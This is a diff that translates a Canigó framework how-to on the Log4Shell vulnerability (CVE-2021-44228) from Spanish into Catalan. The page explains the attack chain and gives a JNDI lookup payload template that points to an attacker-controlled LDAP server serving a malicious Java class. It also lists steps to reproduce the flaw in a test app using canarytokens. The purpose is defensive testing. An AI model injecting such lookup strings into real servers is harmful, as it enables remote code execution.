@@ -1,32 +1,32 @@
 +++
 date        = "2021-12-13"
-title       = "Canigó. Vulnerabilidad: CVE-2021-44228 (log4jshell)"
-description = "Como correguir la vulnerabilidad CVE-2021-44228 (log4jshell)"
-section     = "howtos"
-categories  = ["canigo"]
-key         = "GENER2022"
+title       = "Canigó. Vulnerabilitat: CVE-2021-44228 (log4jshell)"
+description = "Com correguir la vulnerabilitat CVE-2021-44228 (log4jshell)"
+#section     = "howtos"
+#categories  = ["canigo"]
+#key         = "GENER2022"
 +++
 
-Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando una petición JNDI `${jndi:(ldap|rmi|etc)}` dentro cualquier variable que se registre en el log del servidor. Para explotar la vulnerabilidad, se siguen estos pasos:
+La vulnerabilitat [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) permet executar codi en un servidor remot, injectant una petició JNDI `${jndi:(ldap|rmi|etc)}` dins de qualsevol variable que es registri al log del servidor. Per explotar la vulnerabilitat, es poden seguir els següents passos:
 
-1. En el servidor que aloja la aplicación vulnerable, se registra la información que contiene la carga útil maliciosa, por ejemplo: `${jndi:ldap://[servidor]/[carga útil]}`, donde el servidor está controlado por el atacante y la carga útil contiene el comando a ejecutar.
-2. La vulnerabilidad se activa y el servidor vulnerable, solicita al servidor del atacante a través de JNDI el código malicioso.
-3. La respuesta del servidor del atacante contiene la ruta a una clase Java maliciosa, por ejemplo: `http://[servidor]/exploit.class`, que se inyecta en el contexto de la aplicación vulnerable.
-4. La carga útil inyectada permite al atacante ejecutar código arbitrario.
+1. En el servidor que alloja l'aplicació vulnerable, es registra la informació que conté la carga útil maliciosa, por exemple: `${jndi:ldap://[servidor]/[carga útil]}`, on el servidor està controlat pel atacant i la carga útil conté les comandes a executar.
+2. La vulnerabilitat s'activa i el servidor vulnerable, sol·licita al servidor del atacant a través de JNDI el codi maliciós.
+3. La respuesta del servidor del atacant conté la ruta a una clase Java maliciosa, per exemple: `http://[servidor]/exploit.class`, que s'injecta en el context de la aplicació vulnerable.
+4. La carga útil inyectada permet al atacant executar codi arbitrari.
 
-> fuentes: \
+> fonts: \
 > <https://github.com/YfryTchsGD/Log4jAttackSurface> \
 > <https://github.com/christophetd/log4shell-vulnerable-app> \
 > <https://www.tarlogic.com/blog/log4shell-vulnerability-cve-2021-44228/> \
 > <https://securelist.com/cve-2021-44228-vulnerability-in-apache-log4j-library/105210/> \
 > <https://www.randori.com/blog/cve-2021-44228/>
 
-## Como explotar la vulnerabilidad en Canigó
+## Com explotar la vulnerabilitat a Canigó
 
- 1- Crear una aplicación con el archetype de Canigó por ejemplo: `CanigoLog4jShellTest`
+ 1- Crear una aplicació de Canigó que utilitzi una versió de log4j vulnerable, utilitzant per exemple el archetype de Canigó:
 
   ```sh
-  # Canigó 3.6
+  # Canigó 3.6.0
   mvn archetype:generate \ 
   -DarchetypeGroupId=cat.gencat.ctti \
   -DarchetypeArtifactId=plugin-canigo-archetype-rest \
@@ -36,7 +36,9 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   -Dversion=1.0.0 -B
   ```
 
- 2- Modificar el servicio de pruebas: `EquipamentServiceController` para imprimir en el log, los parámetros de entrada del servicio de creación de equipaments
+On el nom de l'aplicació és `CanigoLog4jShellTest`
+
+ 2- Modificar el servei de prova: `EquipamentServiceController` per imprimir en el log els paràmetres d'entrada del servei de creació dels equipaments
 
   ```java
   import org.apache.logging.log4j.LogManager;
@@ -50,7 +52,7 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
   }
   ```
 
- 3- Iniciar el proyecto creado con el servidor tomcat embebido, por ejemplo:
+ 3- Iniciar el projecte creat amb el servidor tomcat embegut, per exemple:
 
   ```sh
   mvn clean spring-boot:run
@@ -69,12 +71,12 @@ Esta vulnerabilidad permite ejecutar código en un servidor remoto, inyectando u
     canigo/app
   ```
 
-### Utilizando el proyecto `canarytokens`
+### Utilizant el projecte `canarytokens`
 
 ---
 
-> El proyecto de código abierto: `canarytokens` permite generar tokens para explotar vulnerabilidades. \
-> Sí al utilizar un token se explota una vulnerabilidad, se envía un correo electrónico con los detalles del acceso \
+> El projecte de codi obert: `canarytokens` permet generar tokens per explotar vulnerabilitats. \
+> Si al utilizar un token s'explota una vulnerabilitat, s'envia un correu electrònic amb els detalls de l'accés \
 > <https://docs.canarytokens.org/guide/> \
 > <https://github.com/thinkst/canarytokens> \
 
